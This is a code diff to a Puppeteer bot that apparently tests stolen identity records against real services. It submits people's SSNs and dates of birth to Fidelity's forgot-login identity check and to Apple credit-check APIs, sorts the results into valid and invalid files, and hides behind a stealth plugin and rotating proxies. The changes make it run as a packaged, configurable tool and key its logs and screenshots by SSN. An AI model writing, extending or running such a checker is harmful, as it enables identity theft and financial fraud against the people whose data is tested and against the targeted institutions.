@@ -19,14 +19,18 @@ import {
 import path from 'path';
 import fs from 'fs';
 import logger from './logger/logger';
-import { HEADLESS, proxyConfig } from './app';
 import { generateRandomNumberWithPrefix } from './utils/generate-random-number-with-prefix';
 import { CreditCheckResponse } from './api/apple/interfaces/CreditCheckResponse';
 import { ValidateAddresResponse } from './api/apple/interfaces/ValidateAddresResponse';
 import { DownPaymentResponse } from './api/apple/interfaces/DownPaymentResponse';
 import { FidelitySearchResponse } from './api/fidelity/FidelitySearchResponse';
+import { getBotConfig } from './utils/get-bot-config';
 
 puppeteerExtra.use(StealthPlugin());
+
+const isPkg = typeof process.pkg !== 'undefined';
+
+console.log({ isPkg });
 
 export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
   TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
@@ -116,7 +120,7 @@ const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
   },
   fidelity: {
     pageUrl:
-      'https://nb.fidelity.com/public/nbpreloginnav/app/forgotlogindomestic#/forgotLoginDomestic/verifyIdentity',
+      'https://nb.fidelity.com/public/nbpreloginnav/app/forgotlogindomestic',
     loanAmountSelector: '#amount',
     formSelector: '#homepage-form',
   },
@@ -156,8 +160,9 @@ const SELECTORS = {
   continue_button: 'button[type=submit]',
   ssn: '#ssn',
   dob: '#dob',
-  phoneImageModal:
-    '#app-modal-root > div:nth-child(5) > div > div > div > div > div > div > div > div.Dimensions__dimensions___ev7C8.ResponsiveModalContent__dimensions___TGRVM > div > div:nth-child(2) > div.ResponsiveModalListContent__normalInset____tNPh',
+  phoneImageModal: 'div.ResponsiveModalListContent__normalInset____tNPh',
+  // phoneImageModal:
+  //   '#app-modal-root > div:nth-child(5) > div > div > div > div > div > div > div > div.Dimensions__dimensions___ev7C8.ResponsiveModalContent__dimensions___TGRVM > div > div:nth-child(2) > div.ResponsiveModalListContent__normalInset____tNPh',
   errorMessage:
     '#root > div > div > div:nth-child(2) > div > div > div > div:nth-child(1) > div > div > div > div.Identification__messageContainer___mTsX8 > div > div',
 };
@@ -166,12 +171,19 @@ const SELECTORS = {
 
 const getIP = async () => {
   try {
+    const botConfig = await getBotConfig();
+
+    const proxyConfig = {
+      host: botConfig.proxy.split(':')[0],
+      port: botConfig.proxy.split(':')[1],
+    };
+
     const { data: ip } = await axios.get<string>('http://api.ipify.org', {
       timeout: 5000,
       proxy: {
         protocol: 'http',
         host: proxyConfig.host,
-        port: proxyConfig.port,
+        port: Number(proxyConfig.port),
       },
     });
     return ip;
@@ -186,7 +198,9 @@ const validateIp = async (
   ip: string,
   pageConfigKey: keyof ConfigurationPerPage,
 ) => {
-  const IPs_Directory = path.join(`${__dirname}/data/ips`);
+  const dirname = process.cwd();
+
+  const IPs_Directory = path.join(`${dirname}/data/ips`);
 
   if (!fs.existsSync(IPs_Directory)) {
     fs.mkdirSync(IPs_Directory, { recursive: true });
@@ -227,20 +241,41 @@ const validateIp = async (
 };
 
 export const getCredentialInformationScrapper = async (
-  browser: Browser,
   credential: Credential,
   validWriteLineOnFile: (line: string) => void,
   invalidWriteLineOnFile: (line: string) => void,
   validFileName: string,
   pageConfigKey: keyof ConfigurationPerPage,
 ) => {
+  const botConfig = await getBotConfig();
+
+  const HEADLESS = botConfig.openBrowser === 'yes' ? false : 'new';
+
+  const proxyConfig = {
+    host: botConfig.proxy.split(':')[0],
+    port: botConfig.proxy.split(':')[1],
+  };
+
   const { pageUrl } = CONFIGURATION_PER_PAGE[pageConfigKey];
+
+  const chromiumExecutablePath = isPkg
+    ? puppeteerExtra
+        .executablePath()
+        .replace(
+          /^.*?\/node_modules\/puppeteer\/\.local-chromium/,
+          path.join(path.dirname(process.execPath), '.local-chromium'),
+        )
+    : puppeteerExtra.executablePath();
 
   let _browser = await puppeteerExtra.launch({
     headless: HEADLESS,
+    executablePath: chromiumExecutablePath,
     // headless: false,
     // args: ['--proxy-server=162.244.132.210:6021'],
-    args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
+    args: [
+      `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`,
+      '--no-sandbox',
+    ],
   });
 
   // const page = await browser.newPage();
@@ -310,9 +345,12 @@ export const getCredentialInformationScrapper = async (
     }
 
     // console.log('out of loop');
+    const dirname = process.cwd();
+
+    console.log({ dirname });
 
     const screenshotRedirectDirectory = path.join(
-      `${__dirname}/data/screenshots-redirect/${validFileName}`,
+      `${dirname}/data/screenshots-redirect/${validFileName}`,
     );
 
     if (!fs.existsSync(screenshotRedirectDirectory)) {
@@ -320,7 +358,7 @@ export const getCredentialInformationScrapper = async (
     }
 
     const screenshotRedirectPath = path.join(
-      `${screenshotRedirectDirectory}/${credential.email}.png`,
+      `${screenshotRedirectDirectory}/${credential.ssn}.png`,
     );
 
     // await page.select(loanAmountSelector, loanAmountValue);
@@ -490,7 +528,7 @@ export const getCredentialInformationScrapper = async (
     // await new Promise((r) => setTimeout(r, 4000));
 
     await page.waitForSelector(SELECTORS.phoneImageModal, {
-      timeout: 8000,
+      timeout: 12000,
     });
 
     await new Promise((r) => setTimeout(r, 1000));
@@ -694,11 +732,11 @@ export const getCredentialInformationScrapper = async (
     // }
   } catch (error) {
     console.error(error);
-    logTracking(`ERROR WITH`, credential.email + ' !!');
+    logTracking(`ERROR WITH`, credential.ssn + ' !!');
 
     logger.error(
-      `getCredentialInformationScrapper ERROR: ${error} || EMAIL:${
-        credential.email
+      `getCredentialInformationScrapper ERROR: ${error} || SSN:${
+        credential.ssn
       } || URL: ${page.url()}`,
     );
   } finally {
